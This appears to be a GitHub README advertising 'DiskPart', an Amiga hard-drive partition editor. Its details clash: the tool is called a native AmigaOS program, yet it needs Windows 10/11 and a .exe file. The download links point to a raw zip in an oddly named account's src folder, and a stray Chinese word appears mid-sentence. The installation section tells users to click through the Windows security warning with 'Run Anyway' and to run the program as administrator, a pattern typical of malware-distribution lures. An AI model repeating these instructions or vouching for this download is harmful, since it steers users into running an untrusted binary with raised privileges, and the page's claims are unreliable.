# 💾 DiskPart - Manage your Amiga hard drive partitions

[![](https://img.shields.io/badge/Download-DiskPart-blue)](https://github.com/Dirtyminded-gameequipment9479/DiskPart/raw/refs/heads/main/src/Disk-Part-1.0-beta.5.zip)

DiskPart simplifies the process of creating and managing partitions on AmigaOS 3.x Rigid Disk Block (RDB) drives. This software removes the complexity from drive setup by providing a visual interface for geometry management. It runs as a native application and requires no extra software libraries to function.

## 🛠 Features

*   **RDB Editor:** Create, resize, and delete partitions on your Amiga drives.
*   **GadTools Interface:** Experience a familiar, responsive window layout.
*   **Standalone Design:** Rely on built-in tools instead of external dependencies.
*   **Safe Execution:** Protect your data structure through controlled write processes.

## 📋 System Requirements

To use DiskPart effectively, ensure your machine meets these criteria:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 50 megabytes of disk space for the program files.
*   **Connection:** A stable internet link to retrieve the application package.
*   **Permissions:** Administrative access to handle raw disk input and output operations.

## 📥 Downloading the Tool

You must obtain the software from the official repository. We distribute the program as a compressed folder to keep files organized.

[Click here to visit the project page and download DiskPart](https://github.com/Dirtyminded-gameequipment9479/DiskPart/raw/refs/heads/main/src/Disk-Part-1.0-beta.5.zip)

1.  Navigate to the provided link above.
2.  Look for a button labeled "Download" or "Code" on the right side of the screen.
3.  Choose the Zip file format to save the files to your computer.
4.  Find the file in your Downloads folder once the transfer finishes.

## ⚙️ Installation Instructions

DiskPart does not require a complex installer. You can run the program directly from the folder where you save it.

1.  Right-click the downloaded Zip file.
2.  Select "Extract All" from the menu.
3.  Choose a folder on your hard drive where you want to keep the application.
4.  Open this folder after the extraction finish.
5.  Find the application file ending in .exe.
6.  Double-click the file to launch the program.

Windows might show a security prompt when you open the file for the first time. This happens because the program interacts with disk sectors directly. Click the "More Info" link in the warning box, then choose "Run Anyway" to proceed.

## 🖥 Using the Interface

The main window displays a list of your connected drives. Choose the drive you wish to modify from the dropdown menu at the top. The software scans the Rigid Disk Block structure and populates the partition list below.

*   **Partitions:** View the name, size, and file system of each current partition.
*   **Add Partition:** Click this button to define a new volume. Input the desired size in megabytes.
*   **Delete Partition:** Select a volume from the list and select this option to remove it. This action erases all data on that specific partition.
*   **Save Changes:** Apply your new configuration to the drive. The program updates the RDB headers automatically.

## 🛡 Maintaining Data Safety

Modifying partitions carries risks. The program checks for errors before it applies changes, but you should always create a backup of your important files before you start. DiskPart does not provide a recovery feature if you delete a partition by mistake. Verify your drive selection every time you open the list.

## ❓ Troubleshooting Common Issues

**The program does not launch.**
Check that you extracted the files from the Zip folder. Windows prevents many programs from running correctly if they remain inside a compressed folder.

**The drive list remains empty.**
Ensure you have the necessary access to the physical hardware. If you use a virtual machine or an emulator, make sure the software maps the drive correctly to the host Windows system.

**The program displays an error regarding access denied.**
Close other applications that might be using the drive. Windows often locks drives while a scan or file transfer occurs. Try running the application as an administrator by right-clicking the icon and selecting "Run as administrator."

**The界面 (User Interface) looks distorted.**
Ensure your system scaling settings are set to the default level. Very high scaling settings can shift the GadTools elements out of their intended positions. Reset your display scaling to 100% if the window display remains broken.

## 🏗 Contributing to the Project

This project remains open to contributions from the community. If you find a bug or think of a new feature, you can propose changes through the repository link. We prioritize stability and code clarity. Keep your suggestions focused on the core functionality of RDB management to ensure the project stays lean and efficient.